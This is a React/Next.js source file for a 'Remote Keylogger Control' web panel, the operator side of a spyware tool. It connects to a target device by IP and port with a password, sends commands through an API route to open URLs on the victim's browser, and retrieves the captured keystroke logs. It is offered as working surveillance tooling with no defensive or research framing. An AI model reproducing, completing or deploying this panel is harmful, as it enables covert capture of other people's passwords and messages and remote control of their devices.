'use client';
import { useState } from 'react';
import styles from './page.module.css';

export default function ControlPanel() {
  const [target, setTarget] = useState('');
  const [password, setPassword] = useState('');
  const [status, setStatus] = useState('disconnected');
  const [logs, setLogs] = useState('');

  const sendCommand = async (command, data = {}) => {
    try {
      const res = await fetch('/api/route', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target, password, command, data })
      });
      
      const result = await res.json();
      if (result.status === 'success') {
        setStatus('connected');
      }
      return result;
    } catch (error) {
      setStatus('error');
      return { status: 'error', message: error.message };
    }
  };

  return (
    <div className={styles.container}>
      <h1>📱 Remote Keylogger Control</h1>
      
      <div className={styles.connection}>
        <input 
          type="text" 
          placeholder="103.148.79.97:5555 (192.168.1.x:5555)" 
          onChange={(e) => setTarget(e.target.value)}
        />
        <input
          type="password"
          placeholder="Password"
          onChange={(e) => setPassword(e.target.value)}
        />
        <button onClick={() => sendCommand('ping')}>Connect</button>
        <p>Status: <span className={styles[status]}>{status}</span></p>
      </div>

      <div className={styles.controlGroup}>
        <h2>Browser Control</h2>
        <input id="urlInput" placeholder="https://example.com" />
        <button onClick={() => 
          sendCommand('open_url', { url: document.getElementById('urlInput').value })
        }>
          Open URL
        </button>
      </div>

      <div className={styles.controlGroup}>
        <h2>System Control</h2>
        <button onClick={() => sendCommand('get_logs')}>
          Get Key Logs
        </button>
        <textarea 
          value={logs} 
          onChange={(e) => setLogs(e.target.value)} 
          placeholder="Key logs will appear here..."
        />
      </div>
    </div>
  );
}
